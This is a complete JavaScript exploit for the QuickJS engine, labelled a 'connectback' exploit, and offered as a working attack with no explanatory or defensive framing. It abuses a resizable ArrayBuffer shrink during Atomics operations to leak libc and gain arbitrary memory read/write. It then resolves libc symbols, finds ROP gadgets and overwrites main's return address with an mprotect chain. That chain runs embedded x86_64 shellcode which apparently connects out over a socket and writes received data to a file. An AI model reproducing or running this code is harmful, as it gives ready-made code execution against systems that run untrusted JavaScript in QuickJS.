'use strict';

// Offset-independent QuickJS Atomics(RAB) exploit -> connectback
// All runtime addresses resolved dynamically (no hardcoded libc/binary offsets).

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

function packLE(bytes) {
  let v = 0n;
  for (let i = 0; i < bytes.length; i++) v |= BigInt(bytes[i] & 0xff) << BigInt(i * 8);
  return v;
}

// -------------------- 1) libc pointer leak via unsorted-bin fd --------------------
function leak_libc_ptr() {
  // Ensure the ArrayBuffer backing store is not the top chunk by allocating a
  // second large buffer after it. Then shrinking produces a real free chunk
  // whose metadata contains libc pointers.
  const L1 = 0x2000;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);
  let guard = new ArrayBuffer(0x2000, { maxByteLength: 0x2000 });
  let evil = { valueOf() { rab.resize(L2); return 0n; } };
  // index 7 -> offset 0x38, which overlaps the freed chunk's bk pointer (libc)
  let leak = u64(Atomics.add(ta, 7, evil));
  // keep guard alive
  if (guard.byteLength !== 0x2000) print('');
  return leak;
}

// -------------------- 2) stale write -> corrupt BigUint64Array u.ptr => arb u64 r/w --------------------
// From quickjs.c struct layout: JSObject.u.array.u.ptr is at +0x38 on x86_64.
const OFF_JSOBJECT_U_ARRAY_UPTR = 0x38;

function align16(n) { return (n + 0xf) & ~0xf; }

function make_arb_u64_view(base_addr, backing_bytes) {
  let backing = new ArrayBuffer(backing_bytes);
  let victim = null;
  let drain = null;

  // Choose sizes so that realloc shrink leaves a remainder chunk matching sizeof(JSObject) allocation.
  // L2=0x20 => new malloc chunk size 0x30. Choose L1 so old chunk size 0x90 => remainder 0x60.
  // JSObject is ~0x48 bytes => malloc chunk size 0x60 on x86_64.
  const L1 = 0x70;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);

  // Prevent the RAB backing store from being the top chunk:
  // otherwise glibc may merge the shrink remainder into the top chunk,
  // and there will be no free chunk to overlap/corrupt.
  let guard = new ArrayBuffer(0x100);

  const new_chunk_sz = align16(L2 + 0x10);
  const target_off = new_chunk_sz + OFF_JSOBJECT_U_ARRAY_UPTR;
  const target_idx = (target_off / 8) | 0;

  let evil = {
    valueOf() {
      // Drain any existing tcache entries for sizeof(JSObject) so the shrink
      // remainder can enter tcache and then be immediately reused by the
      // victim JSObject allocation.
      drain = [];
      for (let i = 0; i < 16; i++) drain.push({});
      rab.resize(L2);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  Atomics.store(ta, target_idx, evil);
  drain = null;
  if (guard.byteLength !== 0x100) print('');

  if (victim === null) throw new Error('victim alloc failed');
  return { victim, base: base_addr, bytes: backing_bytes };
}

function mem_read_u64(mem, addr) {
  let idx = Number((addr - mem.base) >> 3n);
  return u64(mem.victim[idx]);
}

function mem_write_u64(mem, addr, val) {
  let idx = Number((addr - mem.base) >> 3n);
  mem.victim[idx] = u64(val);
}

function mem_read_u8(mem, addr) {
  let a = addr & ~7n;
  let w = mem_read_u64(mem, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffn);
}

function mem_read_u16(mem, addr) {
  return mem_read_u8(mem, addr) | (mem_read_u8(mem, addr + 1n) << 8);
}

function mem_read_u32(mem, addr) {
  return (mem_read_u8(mem, addr) |
         (mem_read_u8(mem, addr + 1n) << 8) |
         (mem_read_u8(mem, addr + 2n) << 16) |
         (mem_read_u8(mem, addr + 3n) << 24)) >>> 0;
}

function mem_read_u64_slow(mem, addr) {
  let lo = BigInt(mem_read_u32(mem, addr));
  let hi = BigInt(mem_read_u32(mem, addr + 4n));
  return u64(lo | (hi << 32n));
}

function mem_read_cstring(mem, addr, maxlen) {
  let s = '';
  for (let i = 0; i < maxlen; i++) {
    let c = mem_read_u8(mem, addr + BigInt(i));
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

// -------------------- 3) find libc base by scanning downward for ELF header --------------------
function find_elf_base_from_ptr(leak_ptr) {
  let leakPage = leak_ptr & ~0xfffn;
  const scan = 0x240000;
  let start = (leakPage - BigInt(scan)) & ~7n;

  // Try a few times in case heap placement isn't perfect on the first attempt.
  for (let attempt = 0; attempt < 12; attempt++) {
    let mem = make_arb_u64_view(start, scan + 0x2000);
    for (let off = scan; off >= 0; off -= 0x1000) {
      let addr = (start + BigInt(off)) & ~7n;
      let w = mem_read_u64(mem, addr);
      if ((w & 0xffffffffn) === 0x464c457fn) {
        return addr & ~0xfffn;
      }
    }
  }
  return 0n;
}

// -------------------- 4) minimal ELF dynamic symbol resolver --------------------
function elf_abs(base, val) {
  if (val < 0x100000000n) return base + val;
  return val;
}

function parse_elf64_dyn(mem, base) {
  const e_phoff = mem_read_u64_slow(mem, base + 0x20n);
  const e_phentsize = mem_read_u16(mem, base + 0x36n);
  const e_phnum = mem_read_u16(mem, base + 0x38n);

  let dyn_vaddr = 0n;
  let dyn_memsz = 0n;
  let text_lo = 0n, text_hi = 0n;

  const PT_LOAD = 1;
  const PT_DYNAMIC = 2;
  const PF_X = 1;

  for (let i = 0; i < e_phnum; i++) {
    let ph = base + e_phoff + BigInt(i * e_phentsize);
    let p_type = mem_read_u32(mem, ph + 0n);
    let p_flags = mem_read_u32(mem, ph + 4n);
    let p_vaddr = mem_read_u64_slow(mem, ph + 0x10n);
    let p_memsz = mem_read_u64_slow(mem, ph + 0x28n);

    if (p_type === PT_DYNAMIC) {
      dyn_vaddr = p_vaddr;
      dyn_memsz = p_memsz;
    }
    if (p_type === PT_LOAD && (p_flags & PF_X)) {
      text_lo = base + p_vaddr;
      text_hi = text_lo + p_memsz;
    }
  }

  if (dyn_vaddr === 0n) throw new Error('no PT_DYNAMIC');

  let dyn = base + dyn_vaddr;
  let dt_strtab = 0n, dt_symtab = 0n, dt_hash = 0n, dt_gnu_hash = 0n;
  let dt_syment = 0n;

  const DT_NULL = 0n;
  const DT_STRTAB = 5n;
  const DT_SYMTAB = 6n;
  const DT_HASH = 4n;
  const DT_GNU_HASH = 0x6ffffef5n;
  const DT_SYMENT = 11n;

  for (let off = 0n; off < dyn_memsz; off += 0x10n) {
    let d_tag = mem_read_u64_slow(mem, dyn + off);
    let d_val = mem_read_u64_slow(mem, dyn + off + 8n);
    if (d_tag === DT_NULL) break;
    if (d_tag === DT_STRTAB) dt_strtab = elf_abs(base, d_val);
    if (d_tag === DT_SYMTAB) dt_symtab = elf_abs(base, d_val);
    if (d_tag === DT_HASH) dt_hash = elf_abs(base, d_val);
    if (d_tag === DT_GNU_HASH) dt_gnu_hash = elf_abs(base, d_val);
    if (d_tag === DT_SYMENT) dt_syment = d_val;
  }

  if (dt_syment === 0n) dt_syment = 24n;

  let nsyms = 0;
  if (dt_hash !== 0n) {
    nsyms = mem_read_u32(mem, dt_hash + 4n);
  } else if (dt_gnu_hash !== 0n) {
    let nbuckets = mem_read_u32(mem, dt_gnu_hash + 0n);
    let symoffset = mem_read_u32(mem, dt_gnu_hash + 4n);
    let bloom_size = mem_read_u32(mem, dt_gnu_hash + 8n);
    let buckets_off = 16n + BigInt(bloom_size) * 8n;
    let buckets = dt_gnu_hash + buckets_off;
    let chains = buckets + BigInt(nbuckets) * 4n;

    let max_sym = 0;
    for (let i = 0; i < nbuckets; i++) {
      let b = mem_read_u32(mem, buckets + BigInt(i * 4));
      if (b > max_sym) max_sym = b;
    }
    if (max_sym < symoffset) {
      nsyms = symoffset;
    } else {
      let idx = max_sym;
      while (true) {
        let h = mem_read_u32(mem, chains + BigInt((idx - symoffset) * 4));
        idx++;
        if (h & 1) break;
      }
      nsyms = idx;
    }
  } else {
    throw new Error('no hash tables');
  }

  return {
    base,
    strtab: dt_strtab,
    symtab: dt_symtab,
    syment: Number(dt_syment),
    nsyms,
    text_lo,
    text_hi,
  };
}

function elf_lookup_sym(elf, mem, name) {
  const c0 = name.charCodeAt(0);
  for (let i = 0; i < elf.nsyms; i++) {
    let sym = elf.symtab + BigInt(i * elf.syment);
    let st_name = mem_read_u32(mem, sym + 0n);
    if (st_name === 0) continue;
    let st_shndx = mem_read_u16(mem, sym + 6n);
    if (st_shndx === 0) continue;

    let name_addr = elf.strtab + BigInt(st_name);
    if (mem_read_u8(mem, name_addr) !== c0) continue;

    let s = mem_read_cstring(mem, name_addr, name.length + 1);
    if (s === name) {
      let st_value = mem_read_u64_slow(mem, sym + 8n);
      return elf.base + st_value;
    }
  }
  return 0n;
}

// -------------------- 5) gadget finder in libc text --------------------
function find_gadget(mem, start, end, bytes) {
  const len = bytes.length;
  const pat = packLE(bytes);
  const mask = (1n << BigInt(len * 8)) - 1n;

  let a = start & ~7n;
  let last = end - BigInt(len);
  for (; a <= last; a += 8n) {
    let w1 = mem_read_u64(mem, a);
    let w2 = mem_read_u64(mem, a + 8n);
    for (let pos = 0; pos < 8; pos++) {
      let addr = a + BigInt(pos);
      if (addr > last) break;
      let sh = BigInt(pos * 8);
      let chunk = (sh === 0n) ? w1 : ((w1 >> sh) | (w2 << (64n - sh)));
      if ((chunk & mask) === pat) return addr;
    }
  }
  return 0n;
}

function find_pop_rdx_variant(mem, start, end) {
  let g = find_gadget(mem, start, end, [0x5a, 0xc3]);
  if (g) return { addr: g, pops: 1, need_ret_align: false };
  g = find_gadget(mem, start, end, [0x5a, 0x5b, 0xc3]);
  if (g) return { addr: g, pops: 2, need_ret_align: true };
  g = find_gadget(mem, start, end, [0x5a, 0x41, 0x5c, 0xc3]);
  if (g) return { addr: g, pops: 2, need_ret_align: true };
  return null;
}

// -------------------- 6) locate return-site after main() call inside __libc_init_first --------------------
function find_main_return_site(mem, init_first_addr) {
  let scan_end = init_first_addr + 0x200n;
  for (let a = init_first_addr; a < scan_end; a++) {
    if (mem_read_u8(mem, a) !== 0xff) continue;
    let b1 = mem_read_u8(mem, a + 1n);
    if (b1 < 0xd0 || b1 > 0xd7) continue;
    if (mem_read_u8(mem, a + 2n) !== 0x89) continue;
    if (mem_read_u8(mem, a + 3n) !== 0xc7) continue;
    return a + 2n;
  }
  return 0n;
}

// -------------------- 7) shellcode (x86_64 Linux) --------------------
const SC_WORDS = [
  0x000002bf29b0c031n,
  0xd23100000001be00n,
  0xec8148c48949050fn,
  0x66e3894800000200n,
  0x0243c766000203c7n,
  0x00007f0443c70f27n,
  0xb008438948c03101n,
  0xbade8948e7894c2an,
  0x8d4c050f00000010n,
  0x00000004be41206bn,
  0xee894ce7894cc031n,
  0xc08548050ff2894cn,
  0x0149000000e08e0fn,
  0x438be275c62949c5n,
  0x246b8d4cc7894120n,
  0xe7894cc031fe8945n,
  0x050ff2894cee894cn,
  0x0000b58e0fc08548n,
  0x75c62949c5014900n,
  0x4c00243b44c642e2n,
  0xbe4100000080ab8dn,
  0x894cc03100000004n,
  0x0ff2894cee894ce7n,
  0x00848e0fc0854805n,
  0xc62949c501490000n,
  0x00000080838be275n,
  0x0084ab8d4cc18941n,
  0x4cc031ce89450000n,
  0xf2894cee894ce789n,
  0x49577ec08548050fn,
  0xb8e675c62949c501n,
  0xffff9cbf00000101n,
  0x0241ba24738d48ffn,
  0x000001a4ba410000n,
  0x0001b8c08949050fn,
  0xb38d48c7894c0000n,
  0x0fca894c00000084n,
  0x894c00000003b805n,
  0x00000003b8050fc7n,
  0x003cb8050fe7894cn,
  0x3cb8050fff310000n,
  0x00000001bf000000n,
  0x909090909090050fn,
];

// -------------------- main exploit --------------------
function pwn() {
  let leak = leak_libc_ptr();
  let libcBase = find_elf_base_from_ptr(leak);
  if (libcBase === 0n) return;

  let libcMem = make_arb_u64_view(libcBase & ~7n, 0x800000);
  if ((mem_read_u64(libcMem, libcBase) & 0xffffffffn) !== 0x464c457fn) return;

  let elf = parse_elf64_dyn(libcMem, libcBase);

  let mprotect = elf_lookup_sym(elf, libcMem, 'mprotect');
  let environ_sym = elf_lookup_sym(elf, libcMem, 'environ');
  let init_first = elf_lookup_sym(elf, libcMem, '__libc_init_first');
  if (!mprotect || !environ_sym || !init_first) return;

  let envp_ptr = mem_read_u64(libcMem, environ_sym);
  if (!envp_ptr) return;

  let main_ret_site = find_main_return_site(libcMem, init_first);
  if (!main_ret_site) return;

  const stackScan = 0x200000;
  let stackBase = (envp_ptr - BigInt(stackScan)) & ~7n;
  let stackMem = make_arb_u64_view(stackBase, stackScan);

  let n = stackScan >> 3;
  let ret_i = -1;
  for (let i = n - 1; i >= 0; i--) {
    if (stackMem.victim[i] === main_ret_site) { ret_i = i; break; }
  }
  if (ret_i < 0) return;

  let pop_rdi = find_gadget(libcMem, elf.text_lo, elf.text_hi, [0x5f, 0xc3]);
  let pop_rsi = find_gadget(libcMem, elf.text_lo, elf.text_hi, [0x5e, 0xc3]);
  let rdxg = find_pop_rdx_variant(libcMem, elf.text_lo, elf.text_hi);
  if (!pop_rdi || !pop_rsi || !rdxg) return;

  let ret_align = 0n;
  if (rdxg.need_ret_align) {
    ret_align = find_gadget(libcMem, elf.text_lo, elf.text_hi, [0xc3, 0x0f, 0x1f]);
    if (!ret_align) ret_align = find_gadget(libcMem, elf.text_lo, elf.text_hi, [0xc3, 0x66, 0x90]);
    if (!ret_align) ret_align = find_gadget(libcMem, elf.text_lo, elf.text_hi, [0xc3]);
    if (!ret_align) return;
  }

  let sc_addr = (stackBase + 0x10000n) & ~7n;
  let sc_page = sc_addr & ~0xfffn;

  for (let i = 0; i < SC_WORDS.length; i++) {
    mem_write_u64(stackMem, sc_addr + BigInt(i * 8), SC_WORDS[i]);
  }

  let chain = [];
  chain.push(pop_rdi, sc_page);
  chain.push(pop_rsi, 0x2000n);
  chain.push(rdxg.addr, 7n);
  if (rdxg.pops >= 2) chain.push(0n);
  if (rdxg.need_ret_align) chain.push(ret_align);
  chain.push(mprotect);
  chain.push(sc_addr);

  for (let j = 0; j < chain.length; j++) {
    stackMem.victim[ret_i + j] = u64(chain[j]);
  }
}

pwn();